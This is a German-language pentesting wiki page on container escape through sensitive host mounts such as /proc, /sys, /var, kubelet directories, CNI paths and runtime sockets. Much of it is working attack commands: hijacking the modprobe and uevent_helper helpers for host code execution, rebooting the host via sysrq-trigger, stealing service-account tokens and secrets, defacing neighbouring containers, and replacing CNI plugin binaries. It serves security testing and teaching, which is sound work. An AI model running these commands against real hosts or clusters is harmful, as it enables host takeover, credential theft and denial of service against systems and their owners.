# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Host mounts gehören zu den wichtigsten praktischen Container-Escape-Angriffsflächen, da sie die sorgfältig isolierte Prozessansicht häufig wieder auf die direkte Sichtbarkeit von Host-Ressourcen zurückführen. Die gefährlichen Fälle beschränken sich nicht auf `/`. Bind mounts von `/proc`, `/sys`, `/var`, Runtime-Sockets, von kubelet verwalteten Zuständen oder gerätebezogenen Pfaden können Kernel-Steuerungen, Credentials, Dateisysteme benachbarter Container und Management-Schnittstellen der Runtime offenlegen.

Diese Seite existiert getrennt von den einzelnen Schutzseiten, da das Abuse-Modell mehrere Bereiche umfasst. Ein beschreibbarer Host mount ist teilweise wegen der Mount namespaces, teilweise wegen der User namespaces, teilweise wegen der Abdeckung durch AppArmor oder SELinux und teilweise wegen des konkret offengelegten Host-Pfads gefährlich. Die Behandlung als eigenes Thema erleichtert die Bewertung der Angriffsfläche erheblich.

## `/proc`-Exposure

procfs enthält sowohl gewöhnliche Prozessinformationen als auch wichtige Kernel-Steuerungsschnittstellen. Ein Bind mount wie `-v /proc:/host/proc` oder eine Containeransicht, die unerwartet beschreibbare proc-Einträge offenlegt, kann daher zu Information Disclosure, Denial of Service oder direkter Codeausführung auf dem Host führen.

Wichtige procfs-Pfade sind:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Beginne damit zu prüfen, welche wichtigen procfs-Einträge sichtbar oder beschreibbar sind:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Diese Pfade sind aus unterschiedlichen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können bei Schreibzugriff zu Host-Code-Ausführungspfaden werden. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind leistungsfähige Reconnaissance-Quellen für Kernel-Exploitation. `sched_debug` und `mountinfo` geben Prozess-, cgroup- und Dateisystemkontext preis, der dabei helfen kann, das Host-Layout aus dem Container heraus zu rekonstruieren.

Der praktische Wert jedes Pfads ist unterschiedlich. Sie alle so zu behandeln, als hätten sie dieselben Auswirkungen, erschwert die Triage:

- `/proc/sys/kernel/core_pattern`
Bei Schreibzugriff ist dies einer der wirkungsvollsten procfs-Pfade, da der Kernel nach einem Crash einen Pipe-Handler ausführt. Ein Container, der `core_pattern` auf ein in seinem Overlay oder in einem gemounteten Host-Pfad gespeichertes Payload zeigen lassen kann, kann häufig Code-Ausführung auf dem Host erlangen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein eigenes Beispiel.
- `/proc/sys/kernel/modprobe`
Dieser Pfad steuert den Userspace-Helper, den der Kernel verwendet, wenn er Logik zum Laden von Modulen aufrufen muss. Wenn er aus dem Container heraus beschreibbar ist und im Host-Kontext interpretiert wird, kann er zu einer weiteren Primitive für Code-Ausführung auf dem Host werden. Besonders interessant ist er in Kombination mit einer Möglichkeit, den Helper-Pfad auszulösen.
- `/proc/sys/vm/panic_on_oom`
Dies ist normalerweise keine saubere Escape-Primitive, kann aber Speicherdruck in einen hostweiten Denial of Service umwandeln, indem OOM-Bedingungen ein Kernel-Panic-Verhalten auslösen.
- `/proc/sys/fs/binfmt_misc`
Wenn die Registrierungs-Schnittstelle beschreibbar ist, kann der Angreifer einen Handler für einen ausgewählten Magic Value registrieren und Code-Ausführung im Host-Kontext erlangen, sobald eine passende Datei ausgeführt wird.
- `/proc/config.gz`
Nützlich für die Kernel-Exploit-Triage. Damit lässt sich feststellen, welche Subsysteme, Mitigations und optionalen Kernel-Features aktiviert sind, ohne die Paketmetadaten des Hosts zu benötigen.
- `/proc/sysrq-trigger`
Hauptsächlich ein Denial-of-Service-Pfad, aber ein sehr schwerwiegender. Damit kann der Host sofort neu gestartet, in eine Panic versetzt oder anderweitig gestört werden.
- `/proc/kmsg`
Gibt Nachrichten aus dem Kernel-Ringpuffer preis. Nützlich für Host-Fingerprinting und Crash-Analyse sowie in manchen Umgebungen für das Leaken von Informationen, die bei der Kernel-Exploitation hilfreich sind.
- `/proc/kallsyms`
Bei Lesbarkeit wertvoll, da der Pfad Informationen zu exportierten Kernel-Symbolen offenlegt und dabei helfen kann, Annahmen zur Address Randomization während der Entwicklung von Kernel-Exploits zu umgehen.
- `/proc/[pid]/mem`
Dies ist eine direkte Schnittstelle zum Prozessspeicher. Wenn der Zielprozess mit den erforderlichen ptrace-ähnlichen Bedingungen erreichbar ist, kann sie das Lesen oder Ändern des Speichers eines anderen Prozesses ermöglichen. Die tatsächlichen Auswirkungen hängen stark von Credentials, `hidepid`, Yama und ptrace-Einschränkungen ab. Daher ist dies ein leistungsfähiger, aber bedingter Pfad.
- `/proc/kcore`
Gibt eine Ansicht des Systemspeichers im Stil eines Core-Images preis. Die Datei ist riesig und umständlich zu verwenden. Wenn sie jedoch tatsächlich lesbar ist, deutet dies auf eine sehr schlecht geschützte Speicheroberfläche des Hosts hin.
- `/proc/kmem` und `/proc/mem`
Historisch wirkungsvolle Schnittstellen für den direkten Speicherzugriff. Auf vielen modernen Systemen sind sie deaktiviert oder stark eingeschränkt. Wenn sie jedoch vorhanden und nutzbar sind, sollten sie als kritische Findings behandelt werden.
- `/proc/sched_debug`
Leakt Scheduling- und Task-Informationen, durch die sich Identitäten von Host-Prozessen offenlegen können, selbst wenn andere Prozessansichten erwartungsgemäß weniger Informationen zeigen.
- `/proc/[pid]/mountinfo`
Äußerst nützlich, um zu rekonstruieren, wo sich der Container tatsächlich auf dem Host befindet, welche Pfade durch ein Overlay unterstützt werden und ob ein beschreibbarer Mount Host-Inhalte oder nur die Container-Schicht betrifft.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, können sie verwendet werden, um den Host-Pfad des Container-Dateisystems zu ermitteln:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Diese Befehle sind nützlich, da mehrere host-execution tricks erfordern, einen Pfad innerhalb des Containers in den entsprechenden Pfad aus der Sicht des Hosts umzuwandeln.

### Vollständiges Beispiel: Missbrauch des `modprobe`-Helper-Pfads

Wenn `/proc/sys/kernel/modprobe` aus dem Container heraus beschreibbar ist und der Helper-Pfad im Host-Kontext interpretiert wird, kann er auf ein von einem Angreifer kontrolliertes Payload umgeleitet werden:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Der genaue Trigger hängt vom Ziel und vom Kernel-Verhalten ab, aber der wichtige Punkt ist, dass ein beschreibbarer Helper-Pfad einen zukünftigen Kernel-Helper-Aufruf auf von Angreifern kontrollierten Host-Pfad-Inhalt umleiten kann.

### Vollständiges Beispiel: Kernel-Recon mit `kallsyms`, `kmsg` und `config.gz`

Wenn das Ziel eine Exploitability-Bewertung statt eines unmittelbaren Escape ist:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Diese Befehle helfen bei der Beantwortung der Frage, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernelmeldungen interessante Zustände offenlegen und welche Kernel-Features oder Mitigations einkompiliert sind. Die Auswirkungen bestehen normalerweise nicht in einem direkten Escape, können aber die Triage von Kernel-Schwachstellen erheblich verkürzen.

### Vollständiges Beispiel: SysRq-Host-Neustart

Wenn `/proc/sysrq-trigger` beschreibbar ist und die Host-Sicht erreicht:
```bash
echo b > /proc/sysrq-trigger
```
Der Effekt ist ein sofortiger Neustart des Hosts. Dies ist kein subtiler Ansatz, demonstriert aber klar, dass die Offenlegung von procfs weitaus schwerwiegender sein kann als reine Informationspreisgabe.

## Offenlegung von `/sys`

sysfs stellt große Mengen an Kernel- und Gerätestatus bereit. Einige sysfs-Pfade sind hauptsächlich für Fingerprinting nützlich, während andere die Ausführung von Helfern, das Geräteverhalten, die Konfiguration von Security-Modulen oder den Firmware-Status beeinflussen können.

Zu den besonders wichtigen sysfs-Pfaden gehören:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus unterschiedlichen Gründen relevant. `/sys/class/thermal` kann das Verhalten der Temperaturverwaltung und dadurch die Stabilität des Hosts in Umgebungen mit unzureichender Abschirmung beeinflussen. `/sys/kernel/vmcoreinfo` kann Informationen zu Crash-Dumps und zum Kernel-Layout leaken, die beim Low-Level-Fingerprinting des Hosts helfen. `/sys/kernel/security` ist die `securityfs`-Schnittstelle, die von Linux Security Modules verwendet wird; unerwarteter Zugriff darauf kann daher MAC-bezogenen Status offenlegen oder verändern. EFI-Variablenpfade können Firmware-gestützte Boot-Einstellungen beeinflussen und sind dadurch deutlich schwerwiegender als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, da es absichtlich eine entwicklerorientierte Schnittstelle mit deutlich geringeren Sicherheitsanforderungen als gehärtete, produktionsorientierte Kernel-APIs darstellt.

Nützliche Review-Befehle für diese Pfade sind:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Was diese Befehle interessant macht:

- `/sys/kernel/security` kann offenlegen, ob AppArmor, SELinux oder eine andere LSM-Oberfläche auf eine Weise sichtbar ist, die nur auf dem Host hätte verfügbar sein dürfen.
- `/sys/kernel/debug` ist häufig der alarmierendste Fund in dieser Gruppe. Wenn `debugfs` eingehängt und lesbar oder beschreibbar ist, sollte man von einer umfangreichen Kernel-nahen Angriffsfläche ausgehen, deren genaues Risiko von den aktivierten Debug-Knoten abhängt.
- Die Offenlegung von EFI-Variablen ist weniger häufig, hat aber hohe Auswirkungen, da sie firmwaregestützte Einstellungen und nicht nur gewöhnliche Laufzeitdateien betrifft.
- `/sys/class/thermal` ist hauptsächlich für die Host-Stabilität und die Hardware-Interaktion relevant, nicht für eine saubere Shell-ähnliche Escape-Möglichkeit.
- `/sys/kernel/vmcoreinfo` ist hauptsächlich eine Quelle für Host-Fingerprinting und Crash-Analysen und nützlich, um den Kernel-Zustand auf niedriger Ebene zu verstehen.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel möglicherweise einen vom Angreifer kontrollierten Helper ausführen, sobald ein `uevent` ausgelöst wird:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Der Grund, warum dies funktioniert, ist, dass der Pfad des Helpers aus Sicht des Hosts interpretiert wird. Sobald er ausgelöst wird, läuft der Helper im Host-Kontext statt innerhalb des aktuellen Containers.

## Zugriff auf `/var`

Das Mounten des `/var` des Hosts in einen Container wird oft unterschätzt, da es nicht so dramatisch aussieht wie das Mounten von `/`. In der Praxis kann dies ausreichen, um Runtime-Sockets, Container-Snapshot-Verzeichnisse, vom kubelet verwaltete Pod-Volumes, projizierte Service-Account-Tokens und die Dateisysteme benachbarter Anwendungen zu erreichen. Auf modernen Nodes befindet sich in `/var` häufig der operativ interessanteste Container-Status.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann häufig die projizierten Tokens anderer Pods und den Inhalt von Overlay-Snapshots lesen:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Diese Befehle sind nützlich, weil sie zeigen, ob der Mount nur unkritische Anwendungsdaten oder hochgradig wichtige Cluster-Credentials offenlegt. Ein lesbares Service-Account-Token kann lokale Codeausführung unmittelbar in Kubernetes-API-Zugriff umwandeln.

Wenn das Token vorhanden ist, überprüfe, worauf es zugreifen kann, anstatt bei der Entdeckung des Tokens stehenzubleiben:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die Auswirkungen können hier deutlich größer sein als der Zugriff auf den lokalen Node. Ein Token mit weitreichendem RBAC kann ein gemountetes `/var` in eine clusterweite Kompromittierung verwandeln.

### Docker- und containerd-Beispiel

Auf Docker-Hosts befinden sich die relevanten Daten häufig unter `/var/lib/docker`, während sie auf Kubernetes-Nodes mit containerd unter `/var/lib/containerd` oder snapshotter-spezifischen Pfaden liegen können:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Wenn das gemountete `/var` beschreibbare Snapshot-Inhalte einer anderen Workload offenlegt, kann der Angreifer möglicherweise Anwendungsdateien verändern, Webinhalte platzieren oder Startskripte ändern, ohne die Konfiguration des aktuellen Containers anzufassen.

Konkrete Missbrauchsideen, sobald beschreibbare Snapshot-Inhalte gefunden wurden:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Diese Befehle sind nützlich, weil sie die drei wichtigsten Auswirkungsbereiche gemounteter `/var`-Verzeichnisse zeigen: Manipulation von Anwendungen, Wiederherstellung von Secrets und laterale Bewegungen in benachbarte Workloads.

## Kubelet State, Plugins und CNI-Pfade

Ein Mount von `/var/lib/kubelet`, `/opt/cni/bin` oder `/etc/cni/net.d` wird häufig durch privilegierte DaemonSets, CNI agents, CSI node plugins, GPU operators und storage helpers offengelegt. Diese Mounts werden leicht als „node plumbing“ abgetan, befinden sich jedoch direkt im Ausführungspfad für neue Pods und enthalten häufig Kubelet-Credentials, projected secrets, Registrierungssockets, sowie ausführbare hostseitige Plugin-Binaries.

Zu den hochwertigen Zielen gehören:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nützliche Befehle zur Überprüfung sind:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Warum diese Pfade wichtig sind:

- `/var/lib/kubelet/pki` kann kubelet-Client-Zertifikate und andere node-lokale Zugangsdaten offenlegen, die je nach Cluster-Design manchmal gegen den API-Server oder kubelet-seitige TLS-Endpunkte wiederverwendet werden können.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` enthält häufig projizierte Service-Account-Tokens und gemountete Secrets für benachbarte Pods auf demselben Node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` ist hauptsächlich eine Reconnaissance-Oberfläche, aber eine sehr nützliche: Sie zeigt, welche Pods und Container derzeit GPUs, Hugepages, SR-IOV-Geräte und andere knappe node-lokale Ressourcen verwenden.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` und `/var/lib/kubelet/plugins_registry` zeigen, welche CSI-, DRA- und Device-Plugins installiert sind und mit welchen Sockets der kubelet kommunizieren soll. Wenn diese Verzeichnisse beschreibbar und nicht nur lesbar sind, wird der Fund deutlich ernster.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` und `/etc/cni/net.d` liegen direkt auf dem Pfad zur Einrichtung des Pod-Netzwerks. Schreibzugriff ist dort häufig ein verzögerter Host-Ausführungsprimitive und nicht nur eine Offenlegung der Konfiguration.<sup>[[2]](#references)</sup>

### Vollständiges Beispiel: Beschreibbares `/opt/cni/bin`

Wenn ein Host-CNI-Binärverzeichnis mit Lese- und Schreibzugriff gemountet ist, kann das Ersetzen eines Plugins ausreichen, um beim nächsten Erstellen einer Pod-Sandbox auf diesem Node durch den kubelet Host-Ausführung zu erlangen:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Dies ist nicht so unmittelbar wie ein gemounteter `docker.sock`, aber in kompromittierten Kubernetes-Infrastruktur-Pods oft realistischer. Der wichtige Punkt ist, dass die modifizierte Binary später vom Host-Netzwerk-Setup-Flow ausgeführt wird, nicht vom aktuellen Container.

## Runtime-Sockets

Sensible Host-Mounts enthalten häufig Runtime-Sockets statt vollständiger Verzeichnisse. Diese sind so wichtig, dass sie hier ausdrücklich wiederholt werden sollten:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige Exploit-Abläufe, sobald einer dieser Sockets gemountet ist.

Als schnelles Muster für die erste Interaktion:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Wenn eines davon erfolgreich ist, ist der Weg von einem „mounted socket“ zum „start a more privileged sibling container“ normalerweise deutlich kürzer als jeder Kernel-breakout-Pfad.

## Writable Host Path Task Hijack

Ein beschreibbarer Host-Mount muss nicht `/` freigeben, um gefährlich zu sein. Wenn der gemountete Pfad Scripts, Konfigurationsdateien, Hooks, Plugins oder Dateien enthält, die später von einer hostseitigen geplanten Task oder einem Service verwendet werden, kann der Container möglicherweise ändern, was der Host ausführt.

Generischer Review-Ablauf:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Wenn eine beschreibbare Datei von einem Host-Prozess verwendet wird, halte die Payload beim Testen einfach und beobachtbar:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Der interessante Teil ist die Vertrauensgrenze: Der Schreibvorgang erfolgt innerhalb des Containers, die Ausführung findet jedoch später im Kontext des Host-Service statt. Dadurch wird ein eng begrenzter hostPath- oder bind mount zu einem verzögerten Host-Code-Execution-Primitive.

## Mount-bezogene CVEs

Host mounts stehen auch mit Runtime-Schwachstellen in Zusammenhang. Zu den wichtigen aktuellen Beispielen gehören:

- `CVE-2024-21626` in `runc`, bei der ein geleakter Directory File Descriptor das Arbeitsverzeichnis im Host-Dateisystem platzieren konnte.
- `CVE-2024-23651`, `CVE-2024-23652` und `CVE-2024-23653` in BuildKit, bei denen bösartige Dockerfiles, Frontends und `RUN --mount`-Abläufe während Builds erneut den Zugriff auf Host-Dateien, deren Löschung oder erhöhte Privilegien ermöglichen konnten.
- `CVE-2024-1753` in Buildah- und Podman-Build-Abläufen, bei denen manipulierte bind mounts während des Builds `/` im Read-Write-Modus offenlegen konnten.
- `CVE-2025-47290` in `containerd` 2.1.0, bei der ein TOCTOU während des Image-Unpackings es einem speziell erstellten Image ermöglichen konnte, das Host-Dateisystem während des Pull-Vorgangs zu ändern.

Diese CVEs sind hier relevant, weil sie zeigen, dass der Umgang mit Mounts nicht nur eine Frage der Operator-Konfiguration ist. Die Runtime selbst kann ebenfalls Mount-basierte Escape-Bedingungen einführen.

## Prüfungen

Verwende diese Befehle, um die wichtigsten Mount-Exposures schnell zu finden:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Was ist hier interessant:

- Host-Root, `/proc`, `/sys`, `/var` und Runtime-Sockets sind allesamt Findings mit hoher Priorität.
- Schreibbare proc/sys-Einträge bedeuten häufig, dass der Mount hostweite Kernel-Steuerungen statt einer sicheren Container-Ansicht offenlegt.
- Gemountete `/var`-Pfade erfordern eine Prüfung auf Credentials und benachbarte Workloads, nicht nur eine Dateisystemprüfung.
- Kubelet-State-Verzeichnisse sowie CNI-/Plugin-Pfade verdienen dieselbe Priorität wie Runtime-Sockets, da sie sich häufig direkt im Pfad zur Pod-Erstellung und Credential-Verteilung auf dem Node befinden.

## Referenzen

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
